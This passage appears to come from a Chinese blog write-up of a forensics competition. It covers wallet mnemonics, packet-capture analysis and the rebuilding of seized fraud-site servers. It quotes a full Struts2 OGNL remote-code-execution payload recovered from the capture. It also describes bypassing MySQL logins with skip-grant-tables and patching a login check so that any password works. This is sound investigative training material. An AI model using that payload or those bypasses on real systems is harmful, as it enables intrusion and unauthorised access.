）"></a>5.在创建钱包时，应用APP都会建议我们进行助记词备份，方便以后忘记密码后找回钱包，在办案过程中时常会拿到犯罪嫌疑人备份的助记词的情况。请从以下三组助记词中判断出格式正确的一组（ ）</h3><pre><code>A.raw sausage art hub inspire dizzy funny exile local middle shed primaryB.raw sausage art hub inspire dizzy funny middle shed primaryC.raw sausage art funny exile local middle shed primary</code></pre><pre><code>A</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310212300993.png" alt="image-20231021230054949"></p><p>助记词一般是12个单词组成 所以选A</p><h3 id="6-假设上题中正确的助记词为通过侦察找到的嫌疑人钱包助记词备份（已知地址属于以太坊链），请在模拟器中通过imToken-APP恢复嫌疑人钱包，并选出正确钱包地址（-）"><a href="#6-假设上题中正确的助记词为通过侦察找到的嫌疑人钱包助记词备份（已知地址属于以太坊链），请在模拟器中通过imToken-APP恢复嫌疑人钱包，并选出正确钱包地址（-）" class="headerlink" title="6.假设上题中正确的助记词为通过侦察找到的嫌疑人钱包助记词备份（已知地址属于以太坊链），请在模拟器中通过imToken APP恢复嫌疑人钱包，并选出正确钱包地址（ ）"></a>6.假设上题中正确的助记词为通过侦察找到的嫌疑人钱包助记词备份（已知地址属于以太坊链），请在模拟器中通过imToken APP恢复嫌疑人钱包，并选出正确钱包地址（ ）</h3><pre><code>0x63AA203086938f82380A6A3521cCBf9c56d111eA</code></pre><p>其实在火眼上就能找到</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310212302164.png" alt="image-20231021230202120"></p><p>也可以使用助记词恢复钱包：我——管理钱包——添加钱包——ETH——助记词——随便写个密码 就可以恢复钱包</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310212303848.png" alt="image-20231021230317809"></p><h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><h3 id="1-分析“数据包1-cap”，请问客户端为什么访问不了服务器。（-）"><a href="#1-分析“数据包1-cap”，请问客户端为什么访问不了服务器。（-）" class="headerlink" title="1.分析“数据包1.cap”，请问客户端为什么访问不了服务器。（ ）"></a>1.分析“数据包1.cap”，请问客户端为什么访问不了服务器。（ ）</h3><pre><code>A.DDoS攻击B.DoS攻击C.SQL注入D.文档攻击</code></pre><p>文档攻击和sql注入在流量包中的表现形式还是很好辨认的</p><p>查一下dos和ddos攻击的区别</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310240913918.png" alt="image-20231018212827811"></p><p>总的来说 dos是单个攻击者&#x2F;单个计算机对目标计算机&#x2F;服务器发起的攻击 ddos攻击是多个计算机向一个计算机发起的攻击</p><p>分析数据包1中的协议 主要是UDP和TCP 而UDP协议是发送信息后 不确定对方是否回复 也就是非连接状态的 TCP协议是需要进行三次握手 是连接状态的</p><p>在查看数据包会话信息中的TCP协议 主要是10.5.0.19对116.211.168.203发送了大量无用数据 是单个计算机对单个计算机发起的攻击 一台攻击机 因此是<strong>dos攻击</strong></p><h3 id="2-分析“数据包1-cap”，出问题的服务器IP地址是-。（格式：127-0-0-1）"><a href="#2-分析“数据包1-cap”，出问题的服务器IP地址是-。（格式：127-0-0-1）" class="headerlink" title="2.分析“数据包1.cap”，出问题的服务器IP地址是_______。（格式：127.0.0.1）"></a>2.分析“数据包1.cap”，出问题的服务器IP地址是_______。（格式：127.0.0.1）</h3><p>承接第一题 是从10.5.0.19向116.211.168.203发起了大量无用的请求 所以攻击机是10.5.0.19 出问题的服务器是<strong>116.211.168.203</strong></p><h3 id="3-分析“数据包1-cap”，文件下发服务器的IP地址是-。（标准格式：127-0-0-1）"><a href="#3-分析“数据包1-cap”，文件下发服务器的IP地址是-。（标准格式：127-0-0-1）" class="headerlink" title="3.分析“数据包1.cap”，文件下发服务器的IP地址是_______。（标准格式：127.0.0.1）"></a>3.分析“数据包1.cap”，文件下发服务器的IP地址是_______。（标准格式：127.0.0.1）</h3><p>直接选择导出http对象 查看文件大小最大的文件 是java.log</p><p>传输这个文件的服务器是<strong>120.210.129.29</strong></p><p>同时将这个文件导出</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310190826567.png" alt="image-20231019082626426"></p><h3 id="4-分析“数据包1-cap”，攻击者利用-漏洞进行远程代码执行。（标准格式：XXX）"><a href="#4-分析“数据包1-cap”，攻击者利用-漏洞进行远程代码执行。（标准格式：XXX）" class="headerlink" title="4.分析“数据包1.cap”，攻击者利用_______漏洞进行远程代码执行。（标准格式：XXX）"></a>4.分析“数据包1.cap”，攻击者利用_______漏洞进行远程代码执行。（标准格式：XXX）</h3><p>在发送恶意文件java.log的前后数据流中都能看到以下内容</p><pre><code>%&#123;(#nike=&#39;multipart/form-data&#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#39;SuSEfirewall2 stop&#39;).(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds=(#iswin?&#123;&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd&#125;:&#123;&#39;/bin/bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</code></pre><p>搜一下这段代码的含义 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310190832991.png" alt="image-20231019083227944"></p><p>可以发现是<strong>struts2</strong>漏洞</p><h3 id="5-分析“数据包1-cap”，请提取恶意文件，并校验该文件的MD5值为-。-标准格式-abcd"><a href="#5-分析“数据包1-cap”，请提取恶意文件，并校验该文件的MD5值为-。-标准格式-abcd" class="headerlink" title="5.分析“数据包1.cap”，请提取恶意文件，并校验该文件的MD5值为_______。(标准格式:abcd)"></a>5.分析“数据包1.cap”，请提取恶意文件，并校验该文件的MD5值为_______。(标准格式:abcd)</h3><p>在微步云沙箱中直接可以看到</p><pre><code>87540c645d003e6eebf1102e6f904197</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310190831689.png" alt="image-20231019083102636"></p><h3 id="6-分析“数据包2-cap”，其获取文件的路径是-。（标准格式：D-x2F-X-x2F-X-x2F-1-txt）"><a href="#6-分析“数据包2-cap”，其获取文件的路径是-。（标准格式：D-x2F-X-x2F-X-x2F-1-txt）" class="headerlink" title="6.分析“数据包2.cap”，其获取文件的路径是________。（标准格式：D:&#x2F;X&#x2F;X&#x2F;1.txt）"></a>6.分析“数据包2.cap”，其获取文件的路径是________。（标准格式：D:&#x2F;X&#x2F;X&#x2F;1.txt）</h3><p>打开数据包2 在导出http对象中 找到最大的文件<code>mail.png</code> 追踪tcp流 找到文件路径</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310190839784.png" alt="image-20231019083953713"></p><p>是url编码 直接放到浏览器上访问一下就能解码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310190840116.png" alt="image-20231019084040085"></p><p><strong>C:&#x2F;Users&#x2F;Administrator&#x2F;Downloads&#x2F;新建文件夹&#x2F;新建文件夹&#x2F;mail.png</strong></p><h3 id="7-分析“数据包2-cap”，文件下载服务器的认证账号密码是-。（标准格式：123）"><a href="#7-分析“数据包2-cap”，文件下载服务器的认证账号密码是-。（标准格式：123）" class="headerlink" title="7.分析“数据包2.cap”，文件下载服务器的认证账号密码是_______。（标准格式：123）"></a>7.分析“数据包2.cap”，文件下载服务器的认证账号密码是_______。（标准格式：123）</h3><p>文件下载指的是下面这些文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310191249617.png" alt="image-20231019124925587"></p><p>通过查看相应流量包 可以得知 文件下载在192.168.43.208和192.168.43.133之间进行 </p><p>追踪TCP流 发现流0和1处有authorization 但是返回的是401 认证错误</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310191251766.png" alt="image-20231019125113697"></p><p>找到流2之后的数据包 都是认证成功的 base64解码 Authorization信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310191252460.png" alt="image-20231019125242419"></p><p>得到认证账号密码</p><pre><code>admin:passwd</code></pre><h3 id="8-分析“数据包2-cap”，其下载的文件名大小有-字节。（标准格式：123）"><a href="#8-分析“数据包2-cap”，其下载的文件名大小有-字节。（标准格式：123）" class="headerlink" title="8.分析“数据包2.cap”，其下载的文件名大小有________字节。（标准格式：123）"></a>8.分析“数据包2.cap”，其下载的文件名大小有________字节。（标准格式：123）</h3><p>下载的文件就是6题的mail.png 将其保存出来 比赛的时候临时将题目改成了 文件的大小 而不是字节  因此是<strong>206KB</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310191510715.png" alt="image-20231019151013675"></p><h2 id="服务器取证一"><a href="#服务器取证一" class="headerlink" title="服务器取证一"></a>服务器取证一</h2><h3 id="1-服务器系统的版本号是-。（格式：1-1-1111）"><a href="#1-服务器系统的版本号是-。（格式：1-1-1111）" class="headerlink" title="1.服务器系统的版本号是_______。（格式：1.1.1111）"></a>1.服务器系统的版本号是_______。（格式：1.1.1111）</h3><pre><code>7.9.2009 </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231042603.png" alt="image-20231023104252477"></p><h3 id="2、网站数据库的版本号是-。（格式：1-1-1111）"><a href="#2、网站数据库的版本号是-。（格式：1-1-1111）" class="headerlink" title="2、网站数据库的版本号是_______。（格式：1.1.1111）"></a>2、网站数据库的版本号是_______。（格式：1.1.1111）</h3><pre><code>5.6.50</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231045500.png" alt="image-20231023104510306"></p><h3 id="3-宝塔面板的“超时”时间是-分钟。-格式-50"><a href="#3-宝塔面板的“超时”时间是-分钟。-格式-50" class="headerlink" title="3.宝塔面板的“超时”时间是_______分钟。(格式:50)"></a>3.宝塔面板的“超时”时间是_______分钟。(格式:50)</h3><p>宝塔设置开了很多限制 把这里面能关的限制全关了就行</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231049872.png" alt="image-20231023104943836"></p><p>再登录宝塔面板</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231101115.png" alt="image-20231023110140046"></p><p>7200秒  是120分钟</p><pre><code>120</code></pre><h3 id="4-网站源码备份压缩文件SHA256值是-。-格式-64位小写"><a href="#4-网站源码备份压缩文件SHA256值是-。-格式-64位小写" class="headerlink" title="4.网站源码备份压缩文件SHA256值是_______。(格式:64位小写)"></a>4.网站源码备份压缩文件SHA256值是_______。(格式:64位小写)</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231106476.png" alt="image-20231023110635429"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231106531.png" alt="image-20231023110647492"></p><pre><code>0bdeeacf755126dae9efd38f6a6d70323aa95217b629fd389e0e81f9b406be39</code></pre><h3 id="5-分发网站sb-wiiudot-cn管理员密码默认MD5加密盐值是-。-格式-abcd"><a href="#5-分发网站sb-wiiudot-cn管理员密码默认MD5加密盐值是-。-格式-abcd" class="headerlink" title="5.分发网站sb.wiiudot.cn管理员密码默认MD5加密盐值是_______。(格式:abcd)"></a>5.分发网站sb.wiiudot.cn管理员密码默认MD5加密盐值是_______。(格式:abcd)</h3><p>爆翻网站备份源码</p><p>在<code>\wwwroot\wwwroot\sb.wiiudot.cn\app\admin\common.php</code>找到盐值明文</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231116216.png" alt="image-20231023111609167"></p><p>对明文进行md5加密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231117068.png" alt="image-20231023111706012"></p><pre><code>7f5918fe56f4a01d8b206f6a8aee40f2</code></pre><h3 id="6-分发网站sb-wiiudot-cn一共存放了-条通讯录数据。（标准格式-1234）"><a href="#6-分发网站sb-wiiudot-cn一共存放了-条通讯录数据。（标准格式-1234）" class="headerlink" title="6.分发网站sb.wiiudot.cn一共存放了_______条通讯录数据。（标准格式:1234）"></a>6.分发网站sb.wiiudot.cn一共存放了_______条通讯录数据。（标准格式:1234）</h3><h4 id="网站重构"><a href="#网站重构" class="headerlink" title="网站重构"></a>网站重构</h4><p>先添加ip(服务器ip)</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231410751.png" alt="image-20231023141003717"></p><p>将数据库中的服务器地址改为127.0.0.1 直接访问<code>http://192.168.160.142/admin</code>  </p><p>显示mysql数据库密码错误 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231419681.png" alt="image-20231023141904644"></p><p>修改<code>/etc/my.cnf</code> 添加<code>skip-grant-table</code> 在运行<code>service mysql restart</code> 绕过mysql登录密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231420983.png" alt="image-20231023142050931"></p><p>下面就跳转到登陆页面</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231421618.png" alt="image-20231023142148582"></p><p>两种方法进行登陆</p><h5 id="方法一：在数据库中覆盖原有的admin账户密码"><a href="#方法一：在数据库中覆盖原有的admin账户密码" class="headerlink" title="方法一：在数据库中覆盖原有的admin账户密码"></a>方法一：在数据库中覆盖原有的admin账户密码</h5><p>按照第5题的加密方法 使用盐值给<code>123456</code>进行加盐加密 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231426257.png" alt="image-20231023142626214"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231426256.png" alt="image-20231023142659195"></p><p>使用navicat连接上数据库 在app_admin表中将admin账户的密码改为加密后的<code>123456</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231429533.png" alt="image-20231023142949498"></p><p>这样就可以使用<code>admin/123456</code>进行登陆了</p><h5 id="方法二：修改配置文件-绕过对密码的判断"><a href="#方法二：修改配置文件-绕过对密码的判断" class="headerlink" title="方法二：修改配置文件 绕过对密码的判断"></a>方法二：修改配置文件 绕过对密码的判断</h5><p>这里学到一个点 找到<code>\wwwroot\wwwroot\sb.wiiudot.cn\app\admin\controller\Common.php</code> 在里面修改验证密码的函数的判断</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231451492.png" alt="image-20231023145124435"></p><p>将<code>!=</code>改为<code>==</code> 就可以进行任意密码登陆</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231453678.png" alt="image-20231023145331567"></p><p>通讯录数据包括 设备查看 通讯录查看 短信查看 所以通讯录数据共有</p><pre><code>732+67097+52170=119999</code></pre><h3 id="7-全部网站一共有-名受害人。-格式-xxx。不去重-不进行数据恢复"><a href="#7-全部网站一共有-名受害人。-格式-xxx。不去重-不进行数据恢复" class="headerlink" title="7.全部网站一共有_______名受害人。(格式:xxx。不去重,不进行数据恢复)"></a>7.全部网站一共有_______名受害人。(格式:xxx。不去重,不进行数据恢复)</h3><pre><code>506</code></pre><p>使用navicat连接每个网站的数据库 对app_mobile表使用这条sql语句进行查询 将结果相加</p><pre><code>select count(distinct(userid)) from `app_mobile`</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231724088.png" alt="image-20231023172453927"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231725920.png" alt="image-20231023172505872"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231725648.png" alt="image-20231023172523610"></p><h3 id="8-分发网站tf-chongwuxiaoyouxi-com里面一共有-位“组员级别”的管理员。-格式-数字"><a href="#8-分发网站tf-chongwuxiaoyouxi-com里面一共有-位“组员级别”的管理员。-格式-数字" class="headerlink" title="8.分发网站tf.chongwuxiaoyouxi.com里面一共有_______位“组员级别”的管理员。(格式:数字)"></a>8.分发网站tf.chongwuxiaoyouxi.com里面一共有_______位“组员级别”的管理员。(格式:数字)</h3><pre><code>26</code></pre><p>和重构第一个网站时一样 先将数据库地址改为本地 127.0.0.1 在修改报错信息为<code>true</code></p><p>注意一点 第二个网站需要单独配置伪静态 只需要将第一个网站的伪静态复制粘贴过去就行</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231957259.png" alt="image-20231023195653169"></p><p>最后需要修改一下进行密码绕过 同第6题的操作 在Common.php文件夹中将<code>!=</code>改为<code>==</code>即可</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231958860.png" alt="image-20231023195820792"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310231959027.png" alt="image-20231023195902966"></p><p>筛选一下组员级别的管理员 一共有26位</p><h3 id="9-分发网站sb-wiiudot-cn管理员名为“0820”的邀请码是-。-格式-xxx"><a href="#9-分发网站sb-wiiudot-cn管理员名为“0820”的邀请码是-。-格式-xxx" class="headerlink" title="9.分发网站sb.wiiudot.cn管理员名为“0820”的邀请码是_______。(格式:xxx)"></a>9.分发网站sb.wiiudot.cn管理员名为“0820”的邀请码是_______。(格式:xxx)</h3><pre><code>443074</code></pre><p>在<code>app_admin</code>和 <code>app_appconfig</code> 两张表中 先看到名为<code>0820</code>的管理员的id是 141</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310232021090.png" alt="image-20231023202121002"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310232021617.png" alt="image-20231023202134574"></p><p>在找到141对应的邀请码</p><h3 id="10-分发网站sb-wiiudot-cn本地数据库用户sb-wiiudot-cn的密码是-。-格式-xxx"><a href="#10-分发网站sb-wiiudot-cn本地数据库用户sb-wiiudot-cn的密码是-。-格式-xxx" class="headerlink" title="10.分发网站sb.wiiudot.cn本地数据库用户sb_wiiudot_cn的密码是_______。(格式:xxx)"></a>10.分发网站sb.wiiudot.cn本地数据库用户sb_wiiudot_cn的密码是_______。(格式:xxx)</h3><pre><code>KE5f3xnFHYAnG5Dt</code></pre><p>在mysql数据库中能看到密码的哈希值 但是在宝塔中看到的用户密码 加密后并不是这个值</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310232023612.png" alt="image-20231023202330572"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310232026667.png" alt="image-20231023202603631"></p><p>但是在第4题提到的备份文件中的用户密码是正确的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310232024170.png" alt="image-20231023202449133"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310232025896.png" alt="image-20231023202535856"></p><h2 id="服务器取证2"><a href="#服务器取证2" class="headerlink" title="服务器取证2"></a>服务器取证2</h2><h3 id="1-请分析宝塔面板中默认建站目录是-。（标准格式：-x2F-etc-x2F-www）"><a href="#1-请分析宝塔面板中默认建站目录是-。（标准格式：-x2F-etc-x2F-www）" class="headerlink" title="1.请分析宝塔面板中默认建站目录是_______。（标准格式：&#x2F;etc&#x2F;www）"></a>1.请分析宝塔面板中默认建站目录是_______。（标准格式：&#x2F;etc&#x2F;www）</h3><pre><code>/home/wwwroot</code></pre><p>没给内网宝塔登陆地址 就用服务器的ip登陆就行 <code>http://192.168.160.143:8888/400c78c0</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310232102236.png" alt="image-20231023210225189"></p><p>在宝塔中找到默认建站目录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310232101615.png" alt="image-20231023210155441"></p><h3 id="2-在宝塔数据库目录有一个只含有一个表结构的数据库，请找到该“表结构文件”并分析出第六个字段的字段类型是-。（标准格式：int-11-）"><a href="#2-在宝塔数据库目录有一个只含有一个表结构的数据库，请找到该“表结构文件”并分析出第六个字段的字段类型是-。（标准格式：int-11-）" class="headerlink" title="2.在宝塔数据库目录有一个只含有一个表结构的数据库，请找到该“表结构文件”并分析出第六个字段的字段类型是_______。（标准格式：int(11)）"></a>2.在宝塔数据库目录有一个只含有一个表结构的数据库，请找到该“表结构文件”并分析出第六个字段的字段类型是_______。（标准格式：int(11)）</h3><p>在火眼中看到 宝塔的数据库目录中一共有25个数据库</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310232117269.png" alt="image-20231023211754895"></p><p>在mysql解析中一共有8个数据库</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310232118715.png" alt="image-20231023211851642"></p><p>其中在bt数据库列表中的为<code>sjp</code>和<code>gtc</code> 查看发现<code>gtc</code>数据库中只有一个表结构 数据类型为</p><pre><code>CHAR(128)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310232120097.png" alt="image-20231023212016997"></p><h3 id="3-请分析“乐享金融”网站绑定的域名是-。（标准格式：www-baidu-com）"><a href="#3-请分析“乐享金融”网站绑定的域名是-。（标准格式：www-baidu-com）" class="headerlink" title="3.请分析“乐享金融”网站绑定的域名是_______。（标准格式：www.baidu.com）"></a>3.请分析“乐享金融”网站绑定的域名是_______。（标准格式：<a href="http://www.baidu.com)/">www.baidu.com）</a></h3><pre><code>jinrong.goyasha.com</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310232125766.png" alt="image-20231023212529684"></p><h3 id="4-请访问“乐享金融”数据库并找到用户表，假设密码为123456，还原uid为2909，用户名为goyasha加密后密码的值是-。（标准格式：abcdefghijklmnopqrstuvwsyz）"><a href="#4-请访问“乐享金融”数据库并找到用户表，假设密码为123456，还原uid为2909，用户名为goyasha加密后密码的值是-。（标准格式：abcdefghijklmnopqrstuvwsyz）" class="headerlink" title="4.请访问“乐享金融”数据库并找到用户表，假设密码为123456，还原uid为2909，用户名为goyasha加密后密码的值是_______。（标准格式：abcdefghijklmnopqrstuvwsyz）"></a>4.请访问“乐享金融”数据库并找到用户表，假设密码为123456，还原uid为2909，用户名为goyasha加密后密码的值是_______。（标准格式：abcdefghijklmnopqrstuvwsyz）</h3><p>在<code>/www/wwwroot/192.168.19.128/application/common.php</code>中找到密码加密规则</p><pre><code>(md5($upwd . $admin[&#39;utime&#39;])</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310232132899.png" alt="image-20231023213200797"></p><p>这是将用户创建的时间戳和用户密码拼接在一起 在进行md5加密 得到的加密后的密码</p><p>使用navicat连接网站数据库 找到goyasha对应的用户和utime 在进行加密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310232138157.png" alt="image-20231023213800075"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310232138107.png" alt="image-20231023213833048"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310232139249.png" alt="image-20231023213938169"></p><pre><code>d2174d958131ebd43bf900e616a752e1</code></pre><h3 id="5-请重建“乐享金融”，访问平台前台登陆界面，会员登陆界面顶部LOGO上的几个字是-。（标准格式：爱金融）"><a href="#5-请重建“乐享金融”，访问平台前台登陆界面，会员登陆界面顶部LOGO上的几个字是-。（标准格式：爱金融）" class="headerlink" title="5.请重建“乐享金融”，访问平台前台登陆界面，会员登陆界面顶部LOGO上的几个字是_______。（标准格式：爱金融）"></a>5.请重建“乐享金融”，访问平台前台登陆界面，会员登陆界面顶部LOGO上的几个字是_______。（标准格式：爱金融）</h3><p>重建不了一点 直接翻数据库吧 网站的登陆页面大概率是<code>login.html</code>  绝对路径<code>/www/wwwroot/192.168.19.128/application/index/view/login/login.html</code>  </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310250851773.png" alt="image-20231024202732807"></p><p>找到了一张图片 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310250852274.png" alt="image-20231024202822126"></p><p>logo上的字是</p><pre><code>睿文化</code></pre><h3 id="6-请分析“乐享金融”一共添加了-个非外汇产品。（标准格式：5）"><a href="#6-请分析“乐享金融”一共添加了-个非外汇产品。（标准格式：5）" class="headerlink" title="6.请分析“乐享金融”一共添加了_______个非外汇产品。（标准格式：5）"></a>6.请分析“乐享金融”一共添加了_______个非外汇产品。（标准格式：5）</h3><pre><code>2</code></pre><p>翻数据库 在wp_productclass表中找到外汇产品的pcid是5</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310250852211.png" alt="image-20231024204558492"></p><p>再找到wp_productinfo表 非外汇产品的pcid就是除了5之外的产品 但是还要注意<code>isdelete</code>字段的值 有两个产品被删了 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310250852704.png" alt="image-20231024204857814"></p><p>所以一共是2个外汇产品</p><h3 id="7-请分析“乐享金融”设置充值泰达币的地址是-。（标准格式：EDFGF97B46234FDADSDF0270CB3E）"><a href="#7-请分析“乐享金融”设置充值泰达币的地址是-。（标准格式：EDFGF97B46234FDADSDF0270CB3E）" class="headerlink" title="7.请分析“乐享金融”设置充值泰达币的地址是_______。（标准格式：EDFGF97B46234FDADSDF0270CB3E）"></a>7.请分析“乐享金融”设置充值泰达币的地址是_______。（标准格式：EDFGF97B46234FDADSDF0270CB3E）</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310250852646.png" alt="image-20231024205227608"></p><p>泰达币的代号是<code>USDT </code>  在wp_rcset表中找到地址</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310250852686.png" alt="image-20231024205316751"></p><pre><code>85CF33F97B46A88C7386286D0270CB3E</code></pre><h3 id="8-请分析“乐享金融”充值金额大于582402元的受害人充值总金额是-。（标准格式：12345678）"><a href="#8-请分析“乐享金融”充值金额大于582402元的受害人充值总金额是-。（标准格式：12345678）" class="headerlink" title="8.请分析“乐享金融”充值金额大于582402元的受害人充值总金额是_______。（标准格式：12345678）"></a>8.请分析“乐享金融”充值金额大于582402元的受害人充值总金额是_______。（标准格式：12345678）</h3><p>在wp_price_log中找到title中的充值字段 观察发现 account充值金额大于582402的总金额是</p><pre><code>101000087</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310250852957.png" alt="image-20231024205624443"></p><p>或者是使用sql语句</p><pre><code>select SUM(account) from `wp_price_log` WHERE title=&quot;充值&quot; and account &gt; 582402</code></pre><h3 id="9-请分析“乐享金融”银行卡号“6239039472846284913”绑定用户的用户名是-。（标准格式：张三）"><a href="#9-请分析“乐享金融”银行卡号“6239039472846284913”绑定用户的用户名是-。（标准格式：张三）" class="headerlink" title="9.请分析“乐享金融”银行卡号“6239039472846284913”绑定用户的用户名是_______。（标准格式：张三）"></a>9.请分析“乐享金融”银行卡号“6239039472846284913”绑定用户的用户名是_______。（标准格式：张三）</h3><pre><code>kongxin</code></pre><p>nt题 先从wp_bankcard表中找到这个银行卡号</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310250852233.png" alt="image-20231024210704098"></p><p>可以看到uid是2917 但是在在wp_userinfo中看 uid是2917的用户名不是”张教瘦” 是kongxin</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310250852169.png" alt="image-20231024210820280"></p><h3 id="10-请分析“乐享金融”建仓时间为“2022-x2F-03-x2F-01-18-44-01”，平仓时间为“2022-x2F-03-x2F-01-18-52-01”，以太坊-x2F-泰达币的这一笔交易的平仓价格是-。（标准格式：1888-668）"><a href="#10-请分析“乐享金融”建仓时间为“2022-x2F-03-x2F-01-18-44-01”，平仓时间为“2022-x2F-03-x2F-01-18-52-01”，以太坊-x2F-泰达币的这一笔交易的平仓价格是-。（标准格式：1888-668）" class="headerlink" title="10.请分析“乐享金融”建仓时间为“2022&#x2F;03&#x2F;01 18:44:01”，平仓时间为“2022&#x2F;03&#x2F;01 18:52:01”，以太坊&#x2F;泰达币的这一笔交易的平仓价格是_______。（标准格式：1888.668）"></a>10.请分析“乐享金融”建仓时间为“2022&#x2F;03&#x2F;01 18:44:01”，平仓时间为“2022&#x2F;03&#x2F;01 18:52:01”，以太坊&#x2F;泰达币的这一笔交易的平仓价格是_______。（标准格式：1888.668）</h3><p>搜索发现 以太坊是ETH</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310250852333.png" alt="image-20231024211430386"></p><p>将建仓时间转时间戳</p><pre><code>1646131441</code></pre><p>平仓时间转时间戳</p><pre><code>1646131921</code></pre><p>在wp_oreder中找到对应的交易记录 平仓价格就是卖出价格(sellprice)</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310250852447.png" alt="image-20231024211911691"></p><pre><code>2896.924</code></pre><h3 id="11-请分析“乐享金融”订单编号为“202112090946233262”平仓时间是-。（标准格式：2022-1-11-1-22-43）"><a href="#11-请分析“乐享金融”订单编号为“202112090946233262”平仓时间是-。（标准格式：2022-1-11-1-22-43）" class="headerlink" title="11.请分析“乐享金融”订单编号为“202112090946233262”平仓时间是_______。（标准格式：2022-1-11.1:22:43）"></a>11.请分析“乐享金融”订单编号为“202112090946233262”平仓时间是_______。（标准格式：2022-1-11.1:22:43）</h3><pre><code>2023-10-24 